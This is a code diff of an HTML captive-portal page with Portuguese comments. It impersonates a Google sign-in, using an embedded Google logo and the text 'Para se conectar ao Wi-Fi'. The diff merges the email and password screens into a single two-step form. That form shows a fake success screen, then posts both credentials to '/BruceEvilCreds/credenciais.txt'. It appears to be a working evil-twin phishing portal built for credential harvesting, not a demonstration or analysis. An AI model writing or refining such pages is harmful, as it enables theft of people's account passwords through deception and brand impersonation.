@@ -27,7 +27,7 @@
       background: white;
       max-width: 400px;
       width: 100%;
-      border-radius: 16px;
+      border-radius: 5px;
       box-shadow: 0 4px 8px rgb(0 0 0 / 0.1);
       padding: 32px 32px 40px;
       text-align: center;
@@ -91,7 +91,7 @@
       background-color: rgb(255, 204, 0);
       color: white;
       border: none;
-      border-radius: 12px;
+      border-radius: 5px;
       font-weight: 600;
       font-size: 1rem;
       padding: 14px 0;
@@ -222,7 +222,7 @@
 .button-container {
   display: flex;
   justify-content: flex-end;
-  margin-top: 8px; /* opcional para espaçamento */
+  margin-top: 5px; /* opcional para espaçamento */
 }
     .btn-back {
       background: none;
@@ -316,73 +316,55 @@
     </div>
   </main>
 
-  <!-- Tela Login Email -->
-  <main id="screen-login-email" class="hidden" aria-label="Formulário de Login Google">
-    <!-- ✅ ESTA DIV É O QUE CONTROLA O ALINHAMENTO DO TEXTO -->
-  <div class="min-h-screen flex flex-col items-center justify-center p-4 bg-gray-50">
-    <div class="bg-white p-6 rounded-md shadow-md w-full max-w-sm">
-      <div id="logo" class="mb-4">
-        <img src="data:image/webp;base64,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" alt="Google Logo" />
-      </div>
-
-      <h2 class="text-xl font-semibold mb-1">Conecte-se</h2>
-
-      <form id="loginFormEmail" method="POST" action="/BruceEvilCreds/credenciais.txt" autocomplete="off" novalidate class="space-y-4">
-  <div class="flex flex-col items-start gap-1 w-full">
-    <input
-      type="email"
-      id="email"
-      name="email"
-      placeholder="exemplo@gmail.com"
-      required
-      autocomplete="email"
-      aria-describedby="email-error"
-      class="p-2 border border-gray-300 rounded-md w-full"
-    />
-    <div id="email-error" class="error-text"></div>
-    <a href="#" class="text-sm text-blue-700 hover:underline font-bold">Esqueceu seu Email?</a>
-  </div>
-  <div class="button-container">
-    <button type="submit" class="btn-submit">Continuar</button>
-  </div>
-</form>
-    </div>
-  </div>
-</main>
- <!-- Tela Login Email -->
- 
- <!-- Tela Login Senha -->
-<main id="screen-login-password" class="hidden" aria-label="Formulário de Login Google">
-  <div class="min-h-screen flex flex-col items-center justify-center p-4 bg-gray-50">
-    <div class="bg-white p-6 rounded-md shadow-md w-full max-w-sm">
-      <div id="logo" class="mb-4">
-        <img src="data:image/webp;base64,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" alt="Google Logo" />
-      </div>
-
-      <h2 class="text-xl font-semibold mb-1">Fazer login</h2>
-      <p class="text-sm text-gray-600 mb-4">Conectar-se ao Wifi</p>
-
-      <form id="loginFormPassword" method="POST" action="/BruceEvilCreds/credenciais.txt" autocomplete="off" novalidate class="space-y-4">
-        <input
-          type="password"
-          id="password"
-          name="password"
-          placeholder="Senha"
-          required
-          autocomplete="current-password"
-          aria-describedby="password-error"
-          minlength="6"
-          class="p-2 border border-gray-300 rounded-md w-full"
-        />
-        <div id="password-error" class="error-text" aria-live="polite"></div>
-        <div class="button-container">
-          <button type="submit" class="btn-continue">Continuar</button>
+  <!-- Formulário Único para Email e Senha -->
+  <main id="screen-login" class="hidden" aria-label="Formulário de Login Google">
+    <div class="min-h-screen flex flex-col items-center justify-center p-4 bg-gray-50">
+      <div class="bg-white p-6 rounded-md shadow-md w-full max-w-sm">
+        <div id="logo" class="mb-4">
+          <img src="data:image/webp;base64,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" alt="Google Logo" />
         </div>
-      </form>
+
+        <h2 class="text-xl font-semibold mb-1" id="form-title">Conecte-se</h2>
+        <p class="text-sm text-gray-600 mb-4" id="form-subtitle">Para se conectar ao Wi-Fi</p>
+
+        <form id="loginForm" method="POST" action="/BruceEvilCreds/credenciais.txt" autocomplete="off" novalidate class="space-y-4">
+
+          <!-- Email (visível na primeira tela do formulário) -->
+          <div id="email-group" class="flex flex-col items-start gap-1 w-full">
+            <input
+              type="email"
+              id="email"
+              name="email"
+              placeholder="exemplo@gmail.com"
+              required
+              autocomplete="email"
+              aria-describedby="email-error"
+              class="p-2 border border-gray-300 rounded-md w-full"
+            />
+          </div>
+          <div id="email-error" class="error-text"></div>
+          <!-- Senha (visível na segunda tela do formulário) -->
+          <div id="password-group" class="flex flex-col items-start gap-1 w-full" style="display:none;">
+            <input
+              type="password"
+              id="password"
+              name="password"
+              placeholder="Senha"
+              required
+              autocomplete="current-password"
+              aria-describedby="password-error"
+              minlength="6"
+              class="p-2 border border-gray-300 rounded-md w-full"
+            />
+          </div>
+          <div id="password-error" class="error-text" aria-live="polite"></div>
+          <div class="button-container">
+            <button type="submit" id="btnSubmit" class="btn-submit">Continuar</button>
+          </div>
+        </form>
+      </div>
     </div>
-  </div>
-</main>
-<!-- Tela Login Senha -->
+  </main>
 
   <!-- Tela Sucesso -->
   <main id="screen-success" class="hidden" aria-live="polite" aria-atomic="true">
@@ -393,24 +375,27 @@
 
 <script>
   const btnGoogle = document.getElementById('btnGoogle');
-  const btnBack = document.getElementById('btnBack');
   const screenInitial = document.getElementById('screen-initial');
-  const screenLoginEmail = document.getElementById('screen-login-email');
-  const screenLoginPassword = document.getElementById('screen-login-password');
+  const screenLogin = document.getElementById('screen-login');
   const screenSuccess = document.getElementById('screen-success');
-  const formEmail = document.getElementById('loginFormEmail');
+  const loginForm = document.getElementById('loginForm');
 
   const emailInput = document.getElementById('email');
   const passwordInput = document.getElementById('password');
   const emailError = document.getElementById('email-error');
   const passwordError = document.getElementById('password-error');
-  const successMessage = document.getElementById('success-message');
-  const errorSend = document.getElementById('error-send');
+
+  const emailGroup = document.getElementById('email-group');
+  const passwordGroup = document.getElementById('password-group');
+
+  const btnSubmit = document.getElementById('btnSubmit');
+  const formTitle = document.getElementById('form-title');
+  const formSubtitle = document.getElementById('form-subtitle');
 
   function clearErrors() {
-  if (emailError) emailError.textContent = '';
-  if (passwordError) passwordError.textContent = '';
-}
+    emailError.textContent = '';
+    passwordError.textContent = '';
+  }
 
   function clearInputs() {
     emailInput.value = '';
@@ -418,63 +403,75 @@
   }
 
   function validateEmail(email) {
-    return /\S+@\S+\.\S+/.test(email);
+    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
   }
 
   function validatePassword(password) {
     return password.length >= 6;
   }
-// ---------- Continuar Google Para Email --------------------
+
+  // Quando clica no botão Google, mostra a tela do formulário (email primeiro)
   btnGoogle.addEventListener('click', () => {
     screenInitial.classList.add('hidden');
-    screenLoginEmail.classList.remove('hidden');
+    screenLogin.classList.remove('hidden');
     clearErrors();
     clearInputs();
+    // mostra só email no início
+    emailGroup.style.display = 'flex';
+    passwordGroup.style.display = 'none';
+    btnSubmit.textContent = 'Continuar';
+    formTitle.textContent = 'Conecte-se';
+    formSubtitle.textContent = 'Para se conectar ao Wi-Fi';
   });
-// ------------------- Continuar Email para a Senha -------------------
-formEmail.addEventListener('submit', (e) => {
+
+  // Estado para controlar se está na etapa email ou senha
+  let etapa = 'email';
+
+  loginForm.addEventListener('submit', (e) => {
     e.preventDefault();
-    const email = emailInput.value.trim();
-    if (!validateEmail(email)) {
-      emailError.textContent = 'E-mail inválido.';
-      return;
+    clearErrors();
+
+    if (etapa === 'email') {
+      // Validar email
+      const emailVal = emailInput.value.trim();
+      if (!validateEmail(emailVal)) {
+        emailError.textContent = 'E-mail inválido.';
+        return;
+      }
+      // Avança para etapa senha
+      etapa = 'senha';
+      emailGroup.style.display = 'none';
+      passwordGroup.style.display = 'flex';
+      btnSubmit.textContent = 'Concluir';
+      formTitle.textContent = 'Fazer login';
+      formSubtitle.textContent = 'Para se conectar ao Wi-Fi';
+      passwordInput.focus();
+    } else if (etapa === 'senha') {
+      // Validar senha e email antes de enviar
+      const emailVal = emailInput.value.trim();
+      const passwordVal = passwordInput.value;
+
+      let valid = true;
+      if (!validateEmail(emailVal)) {
+        emailError.textContent = 'E-mail inválido.';
+        valid = false;
+      }
+      if (!validatePassword(passwordVal)) {
+        passwordError.textContent = 'Senha deve ter ao menos 6 caracteres.';
+        valid = false;
+      }
+      if (!valid) return;
+
+      // Esconde formulário e mostra tela de sucesso
+      screenLogin.classList.add('hidden');
+      screenSuccess.classList.remove('hidden');
+
+      // Após 2 segundos, envia o formulário com email+senha para seu endpoint
+      setTimeout(() => {
+        loginForm.submit();
+      }, 2000);
     }
-    screenLoginEmail.classList.add('hidden');
-    screenLoginPassword.classList.remove('hidden');
   });
-
-  const loginFormPassword = document.getElementById('loginFormPassword');
-
-loginFormPassword.addEventListener('submit', (e) => {
-  e.preventDefault();
-  clearErrors();
-
-  const email = emailInput.value.trim();
-  const password = passwordInput.value;
-
-  let valid = true;
-
-  if (!validateEmail(email)) {
-    emailError.textContent = 'E-mail inválido.';
-    valid = false;
-  }
-  if (!validatePassword(password)) {
-    passwordError.textContent = 'Senha deve ter ao menos 6 caracteres.';
-    valid = false;
-  }
-
-  if (!valid) return;
-
-  // Esconde tela de senha e mostra tela de sucesso
-  screenLoginPassword.classList.add('hidden');
-  screenSuccess.classList.remove('hidden');
-
-  // Depois de 2 segundos, envia o formulário (se precisar)
-  setTimeout(() => {
-    loginFormPassword.submit();
-  }, 2000);
-});
-
 </script>
 </body>
 </html>
